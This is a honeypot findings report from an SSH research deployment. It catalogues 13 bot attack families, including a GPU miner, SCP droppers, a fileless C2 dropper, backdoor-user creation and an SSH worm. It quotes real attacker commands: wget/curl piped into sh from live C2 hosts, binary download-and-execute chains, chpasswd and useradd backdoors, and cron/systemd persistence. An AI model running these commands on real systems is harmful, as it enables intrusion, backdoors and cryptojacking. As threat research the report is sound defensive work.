# Findings -- 226h on a public VPS

Helsinki VPS, port 22, fresh IP, no prior reputation.
Data: 2026-05-26 11:37 UTC to 2026-06-04 21:37 UTC.

```
4537 auth attempts
 292 unique source IPs
1749 sessions accepted
 617621 commands captured
  13 attack families identified
```

---

## Why medium interaction, not low

I started this project aiming for low interaction -- just log auth attempts and see what
credentials bots try. That was the plan.

Then the first logs came in. I saw a GPU miner checking lspci and nvidia-smi. I added
fake GPU output, and suddenly the miner ran its full kill chain instead of exiting. I was
getting real behavior, not just credential lists.

Then I saw the SCP dropper trying 11 directories. I added the SCP wire protocol so the
bot thought its uploads worked and kept going. I added a quarantine directory so I could
capture what it actually sent.

By June 2 the quarantine had caught a real payload -- a Raspberry Pi SSH worm. The ELF
echo injector had dropped four binaries into the session FS. The SSHCHK proof-of-work
was passing because I'd implemented arithmetic expansion with a real recursive descent
parser.

At some point the "low interaction" label stopped being accurate. The code has a stateful
per-session virtual filesystem, ~80 registered command handlers, real pipe chains (stdout
fed as stdin to the next stage), `$((expr))` arithmetic expansion, and the full SCP wire
protocol on both the exec and interactive shell paths. That is medium interaction by any
reasonable definition -- it is closer to Cowrie than to a simple auth logger.

The gaps are real: no `$(cmd)` substitution, no `> file` writes, no live network. But
those gaps do not push it back to low. Low means no shell. This has a shell.

---

## Timeline

Not continuous. Two big waves, one quiet day.

```
2026-05-26     88 commands  -- first bots, mixed families
2026-05-27    545 commands  -- Diicot heavy day
2026-05-28     10 commands  -- quiet
2026-05-29    174 commands  -- threshold=1 deployed, new families appear
2026-05-30  60206 commands  -- family 10 first session, 78min, 4 binaries
2026-05-31 102653 commands  -- family 10 again, family 11 first appearance
2026-06-01 100196 commands  -- family 10 hits 4x, family 6 surge (7 hits in 2h)
2026-06-02 ~507000 commands -- F10 dominates, new 1h9min session (0256bdb274ae), F12 and F13 confirmed
2026-06-03  ~1800 commands  -- quiet, ongoing
2026-06-04  ~7100 commands  -- partial day (data up to 21:37 UTC)
```

Peak: 22:00 UTC, 1321 total attempts across all sessions at that hour (1279 on 2026-05-27 alone).

Almost everything is `SSH-2.0-Go` -- the scanning ecosystem runs on Go's ssh library.
No OpenSSH overhead, thousands of connections per second from a laptop.

---

## Attack families

### 1. Credential stuffing

A wordlist + a script that tries every password on every IP it can reach. That's it.

Works because people reuse passwords. A breach at site A leaks millions of real passwords.
Some of those work at site B. The bot doesn't know your password -- it knows A password
that has a decent chance of being yours.

Top passwords: `123456`, `admin`, `postgres`, `password`, `1234`. All from the RockYou
wordlist, 14 million passwords from a 2009 breach, still the standard.

One IP (`71.227.179.172`) tried 1545 passwords then made 1382 more after getting in.
It's not stopping when it gets a shell -- it wants every working credential, not just one.

One bot sent ~80 passwords in `YYYYMMDD` format (19870825, 19831215...) mixed with
Chinese names (yangchao, wangming, xiaodong). Birth years 1982-1991. That's a real
breach dataset from China, not guessing.

---

### 2. Diicot -- GPU miner

Dominant family. ~180 sessions. Wants to mine Monero on GPU servers.

Monero = cryptocurrency, untraceable, GPU-minable. A Tesla T4 makes real money mining it.
The bot is picky -- it only deploys on machines worth mining on.

Kill chain:

```bash
uname -s -v -n -r -m    # is it Linux x86_64? if not, exit
nproc                    # CPU count
lspci | egrep VGA && lspci | grep 3D    # GPU on the PCI bus?
nvidia-smi -q | grep "Product Name"     # which GPU exactly?
```

Our fake `lspci` shows a Tesla T4. That triggered the next step:

```bash
crontab -r                              # wipe all cron jobs
chattr -iae ~/.ssh/authorized_keys      # make authorized_keys immutable
rm -rf /dev/shm/.x /...                # kill competing miners
```

`chattr -i` is below normal Unix permissions -- even root can't touch that file without
removing the flag first. Once this runs, no other attacker can add their SSH key.
The machine is claimed.

Named after Romania's anti-corruption agency -- the malware author is trolling.

![Diicot session replay](https://github.com/user-attachments/assets/7fce6ce8-85ea-4983-b20b-8cf5eab0e524)

*Session dc727dd9b39f -- 10 commands, 36s. The last exec line is the full kill chain: wipes crontab, locks authorized_keys with chattr, kills competing miners, then deploys.*

---

### 3. SCP dropper

One session 2026-05-26 17:50. Tried 11 directories looking for a writable path:

```bash
mkdir /lib/xlxeavrjsw      ; scp -t -r /lib/xlxeavrjsw/
mkdir /dev/shm/omlvyoqxmgd ; scp -t -r /dev/shm/omlvyoqxmgd/
mkdir /tmp/cygmfsqpwkgd    ; scp -t -r /tmp/cygmfsqpwkgd/
# ... 8 more
```

`scp -t` = server-side receive mode. The bot pushes a file from its machine to ours.
Random 10-char dir names to avoid collisions.

The honeypot speaks the SCP wire protocol (sends the ready byte, parses headers, acks),
so the bot thought all 11 uploads worked. Nothing was actually received.

![SCP dropper session replay](https://github.com/user-attachments/assets/a60ec157-bbe7-479d-85c4-9bc6e4b12c6b)

*Session d22ff677d549 -- 22 commands. Each line is a different directory tried: mkdir then scp -t immediately after. Systematic bruteforce, random 10-char names, all returned exit 0.*

---

### 4. Password changer

4 sessions, 2026-05-26 22:xx to 2026-05-27 01:xx.

```bash
cat /etc/passwd
passwd
echo 'root:$MWtB6=$e6mK#=E' | chpasswd
```

Changes the root password to lock out other attackers. Tries interactive `passwd` first,
falls back to `chpasswd` which reads from stdin -- no terminal needed.

Passwords seen: `i5n#_o$_6qFK!$s` and `$MWtB6=$e6mK#=E`. Strong, machine-generated.
The logic: bots are scanning the same ranges simultaneously. Get in first, change the
password, nobody else can use the machine.

![Password changer session replay](https://github.com/user-attachments/assets/c0dd6abe-c4c2-4f60-aa40-7152b37d4d7a)

*Session 29e4813a04ad -- 4 commands, 2s. `passwd` fails silently, falls back to `chpasswd` with a machine-generated strong password. The whole thing runs and exits before a human could type the first command.*

---

### 5. C2 dropper -- fileless

First appeared 2026-05-29 07:56, 1h41m after switching to threshold=1.
Multiple IPs, same payload.

```bash
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; \
(wget --no-check-certificate -qO- https://14.46.136.77/sh \
 || curl -sk https://14.46.136.77/sh) | sh -s ssh
```

Three things:
- `uname -a` -- OS info sent back to C2
- `echo -e "\x61..."` -- decodes to `auth_ok`. Signals the C2 that auth worked.
- `wget ... | sh` -- downloads a script and runs it directly in memory. Nothing on disk.

No file = nothing for antivirus to find. The script runs and exits, only evidence is
in memory and process table while running.

`-s ssh` tells the script how it got in. Same dropper used for web exploits and RCE --
the entry vector changes what persistence it sets up.

Ran via SSH exec channel (not interactive shell) -- the original scripts missed it entirely.

![C2 dropper session replay](https://github.com/user-attachments/assets/ef6c4883-dbea-45ca-aed6-b68da18d49c2)

*Session a7a62f0046ee -- 1 command, 0s. The hex in the echo decodes to `auth_ok` -- it beacons the C2 that authentication succeeded before pulling and executing the payload.*

---

### 6. w.sh / astats -- persistence bot

First 2026-05-29 14:17. Hits every 30-45min from different IPs.

```bash
# find writable dir
sh -c 'for d in /dev/shm /tmp /var/run ...; do cd "$d" && pwd && break; done'
# drop script
cd "/tmp" && if [ ! -f "w.sh" ]; then cat > "w.sh" && chmod +x w.sh; fi
# cron persistence
CRON="$(crontab -l 2>/dev/null || true)"
# systemd persistence
sh -lc 'mkdir -p ~/.config/systemd/user && cat > ~/.config/systemd/user/watcher-netai.service'
# drop miner
cat > astats
```

Two persistence mechanisms at once -- cron AND systemd user service. Remove one,
the other revives the miner.

Process names: `astats`, `netai`, `kstats`. Look like monitoring tools in `ps aux`.

![w.sh persistence session replay](https://github.com/user-attachments/assets/4e2c3a3c-9924-4baf-8707-1ff991107ec8)

*Session 95bd06bfef71 -- 11 commands, 9s. Cron entry and systemd service written in the same session. The last three lines drop the miner binary three times -- /dev/shm first, then /tmp as fallback.*

---

### 7. VPS infrastructure scout

Two sessions 2026-05-29. 35 commands, no payload.

Checks everything: CPU model, distro (apt/yum/pacman/zypper), network interfaces,
running services, shadow file, disk I/O with `dd`, outbound connectivity via ping.

The `dd bs=1M count=10` benchmark is the tell -- it's measuring disk speed before
deciding if the machine is worth deploying a miner on.

Ended without deploying anything. Machine failed some criterion or it's a pure probe
that reports back to a queue.

![VPS infrastructure scout session replay](https://github.com/user-attachments/assets/37168a2a-fcda-4b73-a9ec-94aef7c55030)

*Session e1877e76a176 -- 35 commands, no payload. Checks package managers, disk speed, network, shadow file. Ends without deploying anything -- the machine passed or failed some internal scoring and the result went back to a queue.*

---

### 8. SSHCHK -- C2 liveness check

2026-05-30 02:20 and 02:23. Two sessions, different IPs, 3 min apart.

```bash
echo SSHCHK_5718926f9304_BEGIN; uname -srm; echo $((7*191+3)); hostname; \
df -P / 2>/dev/null | awk 'NR==2{print $1}'; echo SSHCHK_5718926f9304_END
```

Four things:
- `BEGIN`/`END` markers -- C2 extracts everything between them. Token is unique per
  session, prevents replay attacks.
- `uname -srm` -- OS + kernel + arch
- `echo $((7*191+3))` = 1340 -- math proof-of-work. Shell must evaluate it. A fake
  or broken shell returns the wrong answer.
- `df -P / | awk 'NR==2{print $1}'` -- device name of root filesystem

No follow-up commands. Pure inventory probe -- C2 reads the output and decides
what to send next, externally.

We had to fix the fake shell to pass this check: add arithmetic expansion `$((expr))`,
awk NR==N condition, df -P flag, uname -srm case.

![SSHCHK session replay](https://github.com/user-attachments/assets/e96a9455-3cbe-47c6-9870-8913fb62f7f7)

*Session f63b5f809061 -- 1 command, 0s. The token `5718926f9304` is unique to this session. The C2 strips everything between BEGIN and END and parses the output -- OS, kernel, proof-of-work result, and disk device -- without ever asking for them separately.*

---

### 9. Minimal OS scanner

2026-05-30 06:03 and 07:39. Two sessions, different IPs, 1h36m apart.

```bash
uname -s -m
```

Just that. Gets "Linux x86_64", disconnects. Either cataloguing the internet or
a first-stage probe before a payload bot follows up.

![Minimal OS scanner session replay](https://github.com/user-attachments/assets/93dc0bd0-4f69-4395-819e-9e56007539ab)

*Session d52879b810e9 -- 1 command, 3s. Gets the answer it needs and disconnects immediately. Lightest possible post-auth probe in the dataset.*

---

### 10. ELF echo injector

Single session eb342541b5, 2026-05-30 12:18-13:36 Rabat (78 minutes).
Source IP: 152.89.61.139 (Ukraine). Appeared 17 minutes after deploying the new binary.

Four binaries, injected in sequence. Each one: arch check, try wget then curl from two
C2 servers, fall back to hex echo injection when downloads fail, chmod 777, execute,
delete, then move to the next binary.

```
amd64  -- 5MB, 64-bit Go, stripped
kal64  -- 3MB, 64-bit Go, stripped
kswpad -- 1.2MB, ELF 32-bit x86
linux  -- 1.3MB, ELF 32-bit x86, UPX packed
```

C2 servers tried:
- 195.177.94.72:564
- 45.88.91.135:35146

Both refused connections (fake wget returns errors). So the bot wrote all four binaries
as hex via 43,058 `echo -e -n` chunks -- the entire payload delivered inside the SSH
session itself.

`\x7f\x45\x4c\x46` = ELF magic number. Every Linux binary starts with these 4 bytes.

This is in-band payload delivery -- the payload travels inside the attack, no separate
download needed. Used when outbound HTTP is blocked. The bot carries its full toolkit
in memory and reconstructs it on the target via shell.

All four were chmod 777'd, executed, and deleted. Session ended at 13:36 after `linux`
was deleted. 43,058 echo commands total.

Binary analysis pending -- all four recoverable from session.log hex chunks, also
downloadable from the C2 servers (still live as of 2026-05-30). Haven't done the
Ghidra work yet.

Hit a second time on 2026-05-31 (session eadedac033be). Started 08:37 Rabat, ended
10:58 Rabat -- 1h21min, 43,314 log lines. Same kill chain, same C2 IPs, path changed
from `/b/amd64` to `/s/amd64`. Same four binaries in the same order. C2 still live.

Hit again on 2026-06-02 (session 0256bdb274ae, 45.12.1.49). Started 13:35 Rabat, ended
14:45 Rabat -- 1h9min. Same C2 IPs (195.177.94.72:564, 45.88.91.135:35146), same
`/s/amd64` path, same fallback to hex echo injection when downloads fail. Period 9
total: 506,989 echo commands -- F10 has run enough times to dwarf everything else combined.

![ELF echo injector session replay](https://github.com/user-attachments/assets/e0e2ebce-5f56-48a9-bc47-deba8402e58c)

*Session eadedac033be -- 43,314 commands, 1h21min. Each block is one binary written as hex chunks via echo. wget/curl tried first, failed, then the bot rebuilt the entire payload from shell commands alone.*

---

### 11. Meow dropper -- backdoor + credential harvesting

Two hits 2026-05-31 01:09 and 01:12 UTC, from different IPs, same C2 at 34.11.111.237.

```bash
cd /tmp; ulimit -n 1020000; rm -rf meow*
wget http://34.11.111.237/meow; chmod 777 meow; ./meow
wget http://34.11.111.237/meowarm64; chmod 777 meowarm64; ./meowarm64
echo $(whoami):modzmodz | chpasswd
useradd -m -s /bin/bash admin1; echo admin1:modzmodz | chpasswd; usermod -aG sudo admin1
useradd -m -s /bin/bash user1; echo user1:modzmodz | chpasswd
echo -n 'root:webserver' > /tmp/mew
```

Drops both x86-64 and ARM64 binaries in one shot -- covers both architectures without
checking first. Creates two persistent backdoor users (admin1, user1) both with sudo.
Changes the current user's password to `modzmodz` too.

The `/tmp/mew` line is the tell: writing a credential string to a predictable path.
The second hit had `root:fuck123` instead of `root:webserver` -- same tool, different
parameter. Either two operators sharing the same infrastructure, or a parameterized
campaign where each node gets a different credential to harvest.

Entire kill chain in a single command, run via SSH exec channel (not interactive shell).
No recon, no persistence check -- just drop, execute, and leave.

Binary analysis not done yet. What `meow` actually does is unknown.

![Meow dropper session replay](https://github.com/user-attachments/assets/4507138a-7d2e-4421-b960-ff7adf8893dc)

*Session 72a973e0ba30 -- 1 command, 7s. The entire kill chain in a single exec: download, execute, create two backdoor users, change password, write credential to /tmp/mew. Done before you could read the first line.*

---

### 12. wowo dropper -- deploy and vanish

One session June 2 01:53 UTC, session d9ddf36a96. Source IP 172.210.53.193.

```bash
chmod 777 /usr/bin/curl
cd /tmp
curl -O http://wowo.biz.id/wowiloveyou/runningaway.x86
chmod 777 runningaway.x86
./runningaway.x86 vipies
rm -rf runningaway.x86
history -c
```

Downloads a binary called `runningaway.x86` from `wowo.biz.id`, executes it with
argument `vipies`, deletes it, wipes history. The argument is probably a campaign tag --
different operators or deployments get different tags so the C2 can track them.

`chmod 777 /usr/bin/curl` at the start is unusual. Either it's fixing permissions a
previous attacker broke, or it's a habit from environments where curl gets locked down.

I don't know what `runningaway.x86` does. I haven't analysed it. The domain `wowo.biz.id`
is Indonesian (.id TLD, .biz subdomain). Beyond that I have nothing. The session came
from the same IP as F13 (172.210.53.193) which is interesting -- same machine running
multiple families, or same campaign infrastructure.

Session preceded by a full F7-style 35-command recon (session 517b6d0aebb3). The wowo
deploy only happens if the recon passes some internal check. I need to understand what
that check is.

TODO: check if wowo.biz.id/wowiloveyou/runningaway.x86 is still live, analyse the binary,
figure out the relationship between F7 recon and F12 deploy.

---

### 13. gJw27HGL -- SSH worm (two-bot pattern)

Two sessions June 2 09:40 UTC. What looked like a coordinated two-stage attack: one bot
uploads a file to `/tmp/gJw27HGL` via SCP, a different IP executes it. The executor
actually showed up 3.5h earlier at 06:06 -- before the upload. They're not coordinated,
they just both hit the honeypot independently.

The quarantine captured the payload. It's a bash script, 4.7KB. I haven't done a proper
analysis yet -- I know what's in it from reading the source but I don't understand the
full picture: what the IRC channel is used for, who operates it, what the binaries it
references actually do, whether it's a known family. What I can see from the script:

- kills a list of competing processes before doing anything
- adds an SSH key to /root/.ssh/authorized_keys
- connects to IRC and waits for commands
- spreads itself via SSH using `sshpass` with hardcoded passwords

The passwords it tries are Raspberry Pi defaults. So it's targeting Pi devices, not
generic servers. Why it hit a Helsinki VPS running Ubuntu I don't fully understand yet --
probably just spraying everything on port 22.

This is the first real attacker payload the quarantine actually captured. Previous file
in quarantine was my own test from dropper_sim.go.

Analysis pending. I need to learn IRC C2 basics and how to trace a bash script's network
behavior before I can say anything meaningful about this one.

---

## Effect of auth-threshold=1

Deployed 2026-05-29 06:15 UTC. Accept any password on first attempt.

```
                before    after
attempts          102       143   +40%
unique IPs         12        41  +242%
single-shot         5        27  +440%
accepted            8       143 +1688%
commands            6       234 +3800%
new families      none    5 new
```

Families 5-10 are all single-shot -- they try once, get rejected, leave without a trace.
Under threshold=10 they were completely invisible.

Verified in logs: C2 dropper first hit at 07:56 (1h41m after change), VPS scout at
09:48, w.sh bot at 14:17. Zero sessions of these families in the 68h before the change.

---

## What the honeypot was good at

**GPU bait worked.** Fake Tesla T4 in lspci triggered Diicot's full kill chain. Without
it, they would have exited at "no GPU found".

**SCP handler kept bots engaged.** Speaking the wire protocol meant the SCP dropper ran
all 11 attempts instead of dying on the first rejection.

**Returning exit 0 everywhere** kept bots progressing through their playbook.

**URL logging (added late).** wget/curl now log their URL argument. Family 10 URLs
captured within 17 minutes of deploying.

## What I missed

**The C2 payload at 14.46.136.77/sh** -- pipes into sh, the honeypot can't make real HTTP calls.

**The 4 binaries from the ELF injector session** -- recoverable from session.log hex chunks,
also downloadable from the C2 servers (still live as of 2026-05-30). Haven't done the
analysis yet.

**Interactive shell SCP** -- now fixed. Next SCP dropper session might upload for real.

**$() subshell substitution** -- not implemented. Some bot commands use it and get
empty strings back instead of the right answer.
